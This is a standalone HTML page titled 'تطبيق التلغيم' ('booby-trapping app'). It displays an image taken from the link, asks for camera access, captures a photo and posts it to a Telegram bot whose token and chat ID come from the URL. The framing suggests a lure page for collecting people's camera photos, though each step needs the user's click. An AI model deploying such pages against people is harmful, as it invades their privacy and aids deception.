<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيق التلغيم</title>
</head>
<body style="font-family: Arial; text-align: center; padding: 20px;">
    <h2>📸 تطبيق التلغيم</h2>
    <div id="status">جاري تحميل الصورة...</div>
    <img id="mainImage" src="" style="max-width:100%; border-radius:10px; display:none;">
    <br><br>
    <video id="video" style="width:100%; max-width:400px; display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <button id="captureBtn" style="display:none; padding:10px 20px; background:#0088cc; color:white; border:none; border-radius:20px; cursor:pointer;">📷 التقاط صورة</button>
    <button id="sendBtn" style="display:none; padding:10px 20px; background:#28a745; color:white; border:none; border-radius:20px; cursor:pointer;">📤 إرسال</button>
    <div id="result"></div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const token = params.get('token');
        const chatId = params.get('chatId');
        const imageUrl = params.get('image');

        const mainImg = document.getElementById('mainImage');
        const statusDiv = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('captureBtn');
        const sendBtn = document.getElementById('sendBtn');
        const resultDiv = document.getElementById('result');

        if (!token || !chatId || !imageUrl) {
            statusDiv.innerHTML = '⚠️ رابط غير صحيح!';
            throw new Error('Missing params');
        }

        // عرض الصورة
        mainImg.src = imageUrl;
        mainImg.style.display = 'block';
        statusDiv.innerHTML = '✅ الصورة جاهزة، يمكنك التقاط صورة جديدة.';
        captureBtn.style.display = 'inline-block';

        let stream = null;
        captureBtn.onclick = async function() {
            try {
                if (stream) stream.getTracks().forEach(t => t.stop());
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                video.srcObject = stream;
                video.style.display = 'block';
                captureBtn.textContent = '📸 التقط الآن';
                captureBtn.onclick = function() {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
                    video.style.display = 'none';
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
                    mainImg.src = dataUrl;
                    mainImg.style.display = 'block';
                    statusDiv.innerHTML = '📸 تم التقاط الصورة، اضغط "إرسال" لإرسالها إلى البوت.';
                    sendBtn.style.display = 'inline-block';
                    captureBtn.style.display = 'none';
                    // حفظ الصورة كـ blob
                    canvas.toBlob(function(blob) {
                        window.capturedBlob = blob;
                    }, 'image/jpeg', 0.9);
                };
            } catch(err) {
                alert('لا يمكن الوصول للكاميرا: ' + err.message);
            }
        };

        sendBtn.onclick = async function() {
            if (!window.capturedBlob) {
                alert('لم تلتقط صورة!');
                return;
            }
            sendBtn.disabled = true;
            sendBtn.textContent = '⏳ جاري الإرسال...';
            const formData = new FormData();
            formData.append('photo', window.capturedBlob, 'captured.jpg');
            try {
                const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, {
                    method: 'POST',
                    body: formData
                });
                const data = await res.json();
                if (data.ok) {
                    statusDiv.innerHTML = '✅ تم الإرسال! ستصلك الصورة من البوت.';
                    sendBtn.style.display = 'none';
                } else {
                    throw new Error(data.description);
                }
            } catch(e) {
                alert('فشل الإرسال: ' + e.message);
                sendBtn.disabled = false;
                sendBtn.textContent = '📤 إرسال';
            }
        };
    </script>
</body>
</html>
